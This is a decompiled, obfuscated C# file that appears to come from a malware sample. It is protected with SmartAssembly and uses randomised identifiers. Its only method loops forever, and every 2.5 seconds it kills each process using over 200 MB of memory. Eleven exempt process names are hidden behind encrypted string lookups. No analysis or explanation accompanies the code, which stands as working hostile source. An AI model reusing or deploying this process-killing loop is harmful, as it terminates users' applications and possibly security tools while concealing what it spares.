using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace PMpBbYpvEb;

public static class nCJyjTPBMPduz
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void yZywvQXlMUbbxf()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107408726)) && !process.ProcessName.Contains(getString_0(107408749)) && !process.ProcessName.Contains(getString_0(107408740)) && !process.ProcessName.Contains(getString_0(107408699)) && !process.ProcessName.Contains(getString_0(107408718)) && !process.ProcessName.Contains(getString_0(107408673)) && !process.ProcessName.Contains(getString_0(107408660)) && !process.ProcessName.Contains(getString_0(107408679)) && !process.ProcessName.Contains(getString_0(107408634)) && !process.ProcessName.Contains(getString_0(107408653)) && !process.ProcessName.Contains(getString_0(107408600)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static nCJyjTPBMPduz()
	{
		Strings.CreateGetStringDelegate(typeof(nCJyjTPBMPduz));
	}
}
